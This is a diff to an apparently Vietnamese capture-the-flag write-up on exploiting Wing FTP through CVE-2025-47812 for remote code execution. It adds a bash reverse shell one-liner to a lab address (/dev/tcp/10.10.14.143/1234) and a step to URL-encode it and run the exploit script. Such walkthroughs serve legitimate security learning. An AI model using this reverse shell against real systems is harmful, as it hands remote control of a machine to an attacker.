@@ -46,8 +46,17 @@ Và có thể thấy được phiên bản của dịch vụ này là `Wing FTP 
 
 Search google tìm poc thì xuất hiện [CVE-2025-47812](https://www.exploit-db.com/exploits/52347), vuln này có dẫn đến RCE:
 
+<img width="1528" height="946" alt="image" src="https://github.com/user-attachments/assets/042845c5-5ee3-41aa-8147-174f6b740116" />
 
+Tạo reverse shell:
 
+```
+bash -c 'bash -i >& /dev/tcp/10.10.14.143/1234 0>&1'
+```
+
+Encode url lại và chạy script:
+
+<img width="778" height="239" alt="image" src="https://github.com/user-attachments/assets/5f161361-2b17-416d-a5f8-69aaf669d5c4" />
 
 
 
